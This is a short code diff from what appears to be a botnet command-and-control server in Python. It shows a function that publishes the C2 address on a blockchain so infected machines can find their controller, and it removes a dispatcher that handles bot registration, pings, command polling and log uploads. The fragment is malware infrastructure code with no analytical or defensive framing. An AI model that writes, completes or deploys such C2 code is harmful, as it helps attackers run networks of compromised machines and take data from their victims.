@@ -360,24 +360,7 @@ def update_c2_url_on_blockchain(c2_url):
     except Exception as e:
         logger.error(f"Error updating C2 URL on the blockchain: {e}")
 
-def handle_client_request(data):
-    try:
-        request = json.loads(data.decode('utf-8'))
-        request_type = request.get('type')
 
-        if request_type == 'register':
-            return register_bot(request)
-        elif request_type == 'ping':
-            return ping(request)
-        elif request_type == 'poll':
-            return poll_commands(request)
-        elif request_type == 'log':
-            return receive_log(request)
-        else:
-            return json.dumps({'status': 'error', 'message': 'Unknown request type'}).encode('utf-8')
-    except Exception as e:
-        logger.exception(f"An error occurred while handling client request: {e}")
-        return json.dumps({'status': 'error', 'message': 'Internal server error'}).encode('utf-8')
 
 def main():
     # Start status checking thread
